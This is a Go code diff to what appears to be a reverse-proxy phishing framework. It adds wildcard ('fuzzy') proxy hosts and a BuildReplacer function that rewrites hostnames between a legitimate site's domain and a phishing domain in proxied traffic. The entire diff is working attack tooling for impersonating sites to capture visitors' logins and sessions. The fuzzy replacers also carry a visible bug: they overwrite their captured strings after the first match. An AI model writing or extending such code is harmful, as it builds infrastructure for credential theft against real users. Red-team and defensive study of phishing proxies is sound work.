@@ -17,6 +17,8 @@ type ProxyHost struct {
 	domain          string
 	handle_session  bool
 	is_landing      bool
+	is_fuzzy        bool
+	size_hint       int
 	auto_filter     bool
 }
 
@@ -107,6 +109,8 @@ type ConfigProxyHost struct {
 	Domain     *string `mapstructure:"domain"`
 	Session    bool    `mapstructure:"session"`
 	IsLanding  bool    `mapstructure:"is_landing"`
+	IsFuzzy    bool    `mapstructure:"is_fuzzy"`
+	SizeHint   int     `mapstructure:"size_hint"`
 	AutoFilter *bool   `mapstructure:"auto_filter"`
 }
 
@@ -178,6 +182,12 @@ type ConfigPhishlet struct {
 	LandingPath *[]string          `mapstructure:"landing_path"`
 	LoginItem   *ConfigLogin       `mapstructure:"login"`
 	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
+}
+
+type Replacer struct {
+	Size    int
+	Matches func(source string) bool
+	Apply   func(source string) string
 }
 
 func NewPhishlet(site string, path string, cfg *Config) (*Phishlet, error) {
@@ -290,11 +300,12 @@ func (p *Phishlet) LoadFromFile(site string, path string) error {
 		if ph.AutoFilter != nil {
 			auto_filter = *ph.AutoFilter
 		}
-		p.addProxyHost(*ph.PhishSub, *ph.OrigSub, *ph.Domain, ph.Session, ph.IsLanding, auto_filter)
+		p.addProxyHost(*ph.PhishSub, *ph.OrigSub, *ph.Domain, ph.Session, ph.IsLanding, ph.IsFuzzy, ph.SizeHint, auto_filter)
 	}
 	if len(p.proxyHosts) == 0 {
 		return fmt.Errorf("proxy_hosts: list cannot be empty")
 	}
+
 	session_set := false
 	for _, ph := range p.proxyHosts {
 		if ph.handle_session {
@@ -680,7 +691,7 @@ func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[str
 	return ret
 }
 
-func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool, auto_filter bool) {
+func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool, is_fuzzy bool, size_hint int, auto_filter bool) {
 	phish_subdomain = strings.ToLower(phish_subdomain)
 	orig_subdomain = strings.ToLower(orig_subdomain)
 	domain = strings.ToLower(domain)
@@ -688,7 +699,7 @@ func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, d
 		p.domains = append(p.domains, domain)
 	}
 
-	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, auto_filter: auto_filter})
+	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, is_fuzzy: is_fuzzy, size_hint: size_hint, auto_filter: auto_filter})
 }
 
 func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, mime []string, regexp string, replace string, redirect_only bool, with_params []string) {
@@ -830,4 +841,95 @@ func (p *Phishlet) parseVersion(ver string) (PhishletVersion, error) {
 		return ret, err
 	}
 	return ret, nil
+}
+
+func (ph ProxyHost) BuildReplacer(unapply bool, phishDomain string) Replacer {
+	// replace phishing stuff with the original domain
+	if unapply {
+		if !ph.is_fuzzy {
+			target := combineHost(ph.phish_subdomain, phishDomain)
+			replacement := combineHost(ph.orig_subdomain, ph.domain)
+
+			return Replacer{
+				Size: len(target),
+				Matches: func(source string) bool {
+					return strings.Contains(source, target)
+				},
+				Apply: func(source string) string {
+					return strings.Replace(source, target, replacement, 1)
+				},
+			}
+		}
+
+		expr := regexp.MustCompile(strings.ReplaceAll(ph.phish_subdomain, "*", "([^-._/]*)") + regexp.QuoteMeta("."+phishDomain))
+		target := combineHost(ph.phish_subdomain, phishDomain)
+		replacement := combineHost(ph.orig_subdomain, ph.domain)
+		sizeHint := ph.size_hint
+		if sizeHint == 0 {
+			sizeHint = len(target)
+		}
+
+		return Replacer{
+			Size: sizeHint,
+			Matches: func(source string) bool {
+				return expr.MatchString(source)
+			},
+			Apply: func(source string) string {
+				matches := expr.FindStringSubmatch(source)
+				if matches == nil || len(matches) <= 1 {
+					return source
+				}
+
+				for i := 1; i < len(matches); i++ {
+					target = strings.Replace(target, "*", matches[i], 1)
+					replacement = strings.Replace(replacement, "*", matches[i], 1)
+				}
+
+				return strings.Replace(source, target, replacement, 1)
+			},
+		}
+	}
+
+	if !ph.is_fuzzy {
+		target := combineHost(ph.orig_subdomain, ph.domain)
+		replacement := combineHost(ph.phish_subdomain, phishDomain)
+
+		return Replacer{
+			Size: len(target),
+			Matches: func(source string) bool {
+				return strings.Contains(source, target)
+			},
+			Apply: func(source string) string {
+				return strings.Replace(source, target, replacement, 1)
+			},
+		}
+	}
+
+	expr := regexp.MustCompile(strings.ReplaceAll(ph.orig_subdomain, "*", "([^-._/]*)") + regexp.QuoteMeta("."+ph.domain))
+	target := combineHost(ph.orig_subdomain, ph.domain)
+	replacement := combineHost(ph.phish_subdomain, phishDomain)
+	sizeHint := ph.size_hint
+	if sizeHint == 0 {
+		sizeHint = len(target)
+	}
+
+	return Replacer{
+		Size: sizeHint,
+		Matches: func(source string) bool {
+			return expr.MatchString(source)
+		},
+		Apply: func(source string) string {
+			matches := expr.FindStringSubmatch(source)
+			if matches == nil || len(matches) <= 1 {
+				return source
+			}
+
+			for i := 1; i < len(matches); i++ {
+				target = strings.Replace(target, "*", matches[i], 1)
+				replacement = strings.Replace(replacement, "*", matches[i], 1)
+			}
+
+			return strings.Replace(source, target, replacement, 1)
+		},
+	}
 }
